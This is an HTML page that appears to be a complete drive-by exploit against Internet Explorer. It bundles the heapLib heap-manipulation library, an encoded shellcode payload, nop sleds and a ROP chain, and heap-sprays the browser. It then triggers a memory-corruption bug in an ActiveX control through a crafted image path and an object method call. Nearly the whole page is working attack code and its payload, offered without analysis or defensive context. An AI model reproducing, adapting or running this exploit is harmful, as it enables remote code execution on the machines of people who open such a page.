<html>
<head>
<script>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
this.heapBase = (heapBase ? heapBase : 0x150000);

// Allocate a padding string that uses maxAlloc bytes
this.paddingStr = "AAAA";

while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
    this.paddingStr += this.paddingStr;
}

// Create an array for storing references to allocated memory
this.mem = new Array();

// Call flushOleaut32() once to allocate the maximum size blocks
this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

if (enable == true)
    void(Math.atan(0xbabe));
else
    void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
if (len > this.paddingStr.length)
    throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
if (round == 0)
    throw "Round argument cannot be 0";

return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
var digits = "0123456789ABCDEF";

var hex = digits.substr(num & 0xF, 1);

while (num > 0xF) {
    num = num >>> 4;
    hex = digits.substr(num & 0xF, 1) + hex;
}

var width = (width ? width : 0);

while (hex.length < width)
    hex = "0" + hex;

return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

// Create an array for this tag if doesn't already exist
if (this.mem[tag] === undefined)
    this.mem[tag] = new Array();

if (typeof arg == "string" || arg instanceof String) {
    // Allocate a new block with strdup of the string argument
    this.mem[tag].push(arg.substr(0, arg.length));
}
else {
    // Allocate the block
    this.mem[tag].push(this.padding((arg-6)/2));
}
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

delete this.mem[tag];

// Run the garbage collector
CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

this.debug("Flushing the OLEAUT32 cache");

// Free the maximum size blocks and push out all smaller blocks

this.freeOleaut32("oleaut32");

// Allocate the maximum sized blocks again, emptying the cache

for (var i = 0; i < 6; i++) {
    this.allocOleaut32(32, "oleaut32");
    this.allocOleaut32(64, "oleaut32");
    this.allocOleaut32(256, "oleaut32");
    this.allocOleaut32(32768, "oleaut32");
}
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if (size == 32 || size == 64 || size == 256 || size == 32768)
    throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

// Allocate the block with the OLEAUT32 allocator
this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

// Free the blocks with the OLEAUT32 free function
this.freeOleaut32(tag);

// Flush the OLEAUT32 cache
this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

this.debug("Running the garbage collector");
CollectGarbage();

this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

var count = (count ? count : 1);

for (var i = 0; i < count; i++) {
    this.alloc(arg);
    this.alloc(arg, "freeList");
}
this.alloc(arg);

this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

var count = (count ? count : 1);

for (var i = 0; i < count; i++)
    this.alloc(arg, "lookaside");

this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
var size;

// Calculate the allocation size
if (typeof arg == "string" || arg instanceof String)
    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
else
    size = arg;

// Make sure that the size is valid
if ((size & 0xf) != 0)
    throw "Allocation size " + size + " must be a multiple of 16";

if (size+8 >= 1024)
    throw("Maximum lookaside block size is 1008 bytes");

// The lookahead array starts at heapBase + 0x688. It contains a 48 byte
// structure for each block size + header size in 8 byte increments.

return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

var size = (size ? size : 1008);

// Make sure the size is valid
if ((size & 0xf) != 0)
    throw "Vtable size " + size + " must be a multiple of 16";

if (shellcode.length*2 > size-138)
    throw("Maximum shellcode length is " + (size-138) + " bytes");

// Build the fake vtable that will go on the lookaside list
//
// lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
// 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

for (var i = 0; i < 124/4; i++)
    vtable += this.addr(jmpecx);

// If the vtable is the only entry on the lookaside, the first 4 bytes will
// be 00 00 00 00, which disassembles as two add [eax], al instructions.
// The jmp ecx trampoline will jump back to the beginning of the vtable and
// execute the add [eax], al instructions. We need to use two sub [eax], al
// instructions to fix the heap.

vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
          shellcode + heap.padding((size-138)/2 - shellcode.length);

return vtable;
}


var heap_obj = new heapLib.ie(0x20000);
var code = unescape("%ub024%u3534%ueb89%u2247%u13e0%u9bfc%u7099%uba43%uf931%ub246%ud433%u37b6%u1b27%uc7fe%uc0c6%u97d5%u7472%u4a79%ub41d%ub9b3%u259f%uf703%u14e3%u92a8%ub191%u8d2f%u4bb8%u4871%uf50a%u0c3c%u8d96%u7c7e%u1c76%ue38c%u2372%u9bfd%ub2be%ub991%ubf9f%ub696%u3a70%u41eb%u7b4e%u4b35%u984f%u7fba%u4a7a%u7148%ub704%u2d46%u90b3%ub10c%ud338%u66e0%ub00d%u803c%ud6f6%u8743%uc6fe%uc0c7%u40fc%u7914%u1915%u34e2%u7492%u3d1d%u2778%u9737%u6705%u2f1c%ud41b%u4293%u77b8%u243f%uf885%ud50b%u7db4%u4947%u99a8%ua925%ubbb5%u202c%u0ae1%u75f9%u6973%u67f5%u6692%u8dbf%ubbb0%ua9b8%u73b4%u9304%u75b6%ube1d%u27b3%u7424%ue202%u3241%u90f9%u7d46%u882f%u37e1%u7c4b%u4e4f%u7f7a%u0372%ub2fd%uba15%u4370%u1a7b%u77f5%ue021%ub94a%ufc33%ub505%ub148%ud010%u86f8%u34d5%u359b%u3d79%u2d47%u970d%ua898%u71b7%u0c42%u182c%u76e3%u4014%ud622%u9149%u2978%u3ceb%ud42b%u9996%u3f7e%u1c25%u769f%u7c72%u7178%u157d%u274a%ub340%uf811%u8dbf%ueb83%ub142%u7799%u962f%uff09%ud2c1%u05e0%ua9b4%ue181%ub647%u0c4f%u7ab8%u7b3c%u730d%u413f%ufd39%u4866%u437e%ub2b5%uba1d%ue331%u244b%u6b2d%u92f5%ufc08%u3b97%u67e2%u1ca8%ube04%ub093%u9b46%ub991%u1434%u357f%ud430%u4e98%u4974%u3d37%ubb25%u9fb7%u702c%uf92a%ud601%u1375%u90d5%u7b79%ua840%u8949%ud6d1%u3d27%ua946%u8448%u0ce0%u438d%u24b1%u1471%u701d%u2879%u7ff5%u7476%ufd12%u6773%ubfb5%ub7b3%ud189%u3bf9%u15fc%u7d93%ub942%u8cb2%u4beb%u3734%ub035%uba98%u1c77%ue331%ue202%u757e%u4e2f%ue110%u057c%u2d04%ub641%u9fbe%ubb97%u259b%u4a91%u4790%u1b99%u4fd5%u96b4%u3c66%u7278%u0d7a%u3f92%uc129%u84f8%ub8d4%u7b7f%u2c71%u9792%u700c%u207d%u66e0%u34b1%u90b5%uf533%u417e%ueb11%ub04b%u73b6%u0940%u27f8%ue288%ub804%u0da8%u7578%ufc3a%u8391%u72e3%ubf2d%ud530%u8d93%ue181%u4e77%uba48%ub3b9%u1915%ud6d3%ub299%ube9b%u4705%ub74a%u0325%ufdd2%u357c%u434f%u4296%u3c49%uf932%u761c%ub42c%u9f67%u1d24%u982f%u1479%u7446%u3d37%u3fa9%u39bb%u7ad4%ufd69%uf913%u7c93%ud02b%u1ae0%u78eb%u7974%u3f2d%u2776%u2f41%ud538%ua90c%u7d34%ue20a%u707a%u087e%u49f8%ubab1%ub4b7%u7f90%u237b%u72f5%u0146%u96d6%u98b8%u8da8%u67b9%ub32c%ue128%ub04e%u9f14%u7771%u9705%u0db6%u0415%u4f91%u2575%u8737%ue3f7%u921c%u3d1d%u4b73%ufc2a%ue285%u7d35%u8642%u21e1%u4ae0%u4074%u247c%u99be%u3c7a%u487b%u79bb%uf622%ub5d4%u9b66%u1275%u47e3%u7fbf%ub243%u3f70%u3573%u1d7e%u0c72%u9790%u7149%u662d%ueb80%uc018%u9bd6%u8d67%u3dbf%u77a8%u4714%u98b8%uf505%ub691%u0478%u46d5%u6bfd%u2ffc%u2496%u34b0%u0d76%u4e2c%u4127%uf9b9%u99be%ub2b4%u4a92%u254b%ub315%ub5ba%uf8a9%u1c37%ub1b7%u483c%u4243%u0bbb%u40d4%u4f9f%ube93%ub5c9%u8ac3%udada%u74d9%uf424%u2b5d%ub1c9%u8333%u04c5%u7531%u030e%ubbbc%u7f21%u2cc2%u802c%uad3a%u084f%u9cdf%u6e5d%u8d94%ue451%u3df8%ua819%ub6e8%u656f%u7e1f%u53c5%u7f2e%u5beb%u43fc%u206d%u97fe%u194d%uea31%u5e8c%u052f%u37dc%ub424%u3cf1%u0578%u92f3%u35f7%u978b%uc2c7%u9921%u7a17%ud13d%uf08f%uc219%ud5ae%u3e79%u52f9%ub449%ub2f8%u3583%ufacb%u0848%uf6e4%u4c91%ue8c2%ua6e7%u9431%u7cff%u4248%u6175%u01ea%u412d%uc50b%u02a8%ua207%u4dbf%u350b%ue613%ube37%u2992%u84be%uedb0%u5f9b%ub4d8%u3141%ua7e5%uee2d%ua343%ufbdf%ueef2%ufab5%u9577%ufdf0%u9687%u9652%u1db6%ue13d%uf446%u1d7a%u550d%ub62a%u0fc8%udb6f%ue5ea%ue2b3%u0c68%u114b%u6570%u5d4e%u9536%uce22%u99d3%uef91%uf9f1%u7c74%ud399%u0413%u2c38");
var nops = unescape("%u0c0c%u0c0c");
var nops_90 = unescape("%u90b7%u9198");
var rop_chain = unescape("%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%ub860%u77c3%uffff%uffff%ube18%u77c1%ub35b%u377c%u362c%u77c2%ud9bb%u77c5%ue071%u77c2%u0d13%u77c5%uffc0%uffff%u8fbc%u77c5%ube18%u77c1%ue55c%u9b66%u8fbc%u77c5%uee15%u77c3%uee15%u77c3%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3");

while (nops.length < 0x80000) nops += nops;
while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset = nops.substring(0, 0x0);
var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
  heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="jATV"></object>
<script>
var obj = document.getElementById('jATV').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(274);
</script>
</body>
</html>
